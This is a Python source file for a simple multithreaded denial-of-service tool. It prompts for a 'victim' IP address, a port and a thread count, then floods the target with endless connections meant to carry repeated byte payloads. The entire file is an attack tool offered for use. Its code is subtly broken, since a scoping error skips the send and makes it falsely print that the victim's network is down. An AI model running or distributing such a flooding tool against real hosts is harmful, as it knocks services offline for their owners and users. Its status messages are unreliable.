import socket
from threading import Thread
from pystyle import *
import time

def check_port(ip: str, port: int) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)

        addr = (ip, port)
        check = sock.connect_ex(addr)
        sock.close()

        return not check
    except:
        return False

def attack(ip: str, port: int, th: int):
    n = 1
    for i in range(th):
        Thread(target=_attack, args=[ip, port]).start()
        print(Colorate.Horizontal(Colors.red, f"Creating thread's {i + 1}..."))


def _attack(ip: str, port: int):
    while True:
        print(Colorate.Horizontal(Colors.blue_to_red, f"Connecting to the server..."))
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            addr = (ip, port)
            sock.connect_ex(addr)
            
            n += 1
            print(Colorate.Horizontal(Colors.blue_to_red, f"Sending bytes to {ip}:{port}..."))
            sock.send(b'Dos tool Here -> https://github.com/catcha8/Dos \n'*1024)
        except:
            print(Colorate.Horizontal(Colors.red_to_blue, "/!\ Connection lost, Victim network is down ! /!\ "))

if __name__ == '__main__':
    System.Title("Dos Tool catcha8 Github: https://github.com/catcha8/Dos")
    System.Size(60, 60)

    ip = Write.Input("Enter the IP address of the victim\n\n\n\n>", Colors.yellow_to_green, interval=0.015)

    port = Write.Input("Enter the port \nExample:\nHTTP:8080\nHTTPS:443\n\n\n\n>", Colors.yellow_to_green, interval=0.015)
    
    try:
        port = int(port)
    except ValueError:
        Colorate.Error(port, " port is not valid, restart the script", wait=True)

    threads = Write.Input("Enter threads (press enter for 1000) -> ", Colors.yellow_to_green, interval=0.005)
    if not threads: threads = '1000'

    try:
        threads = int(threads)
    except ValueError:
        Colorate.Error("\nNumber on threads is not valid, restart the program...", wait=True)


    print('\n')

    if check_port(ip, port):
        print("Attack starting to:",ip,":",port)
        Write.Input(f"Attack starting to: {ip}:{port}", Colors.yellow_to_green, interval=0.005)
        time.sleep(5)
    else:
        Write.Input(f"The system is not available to start an attack to > {ip}:{port}\n Retry and check the informations..", Colors.yellow_to_green, interval=0.005)
        exit()

    attack(ip, port, threads)
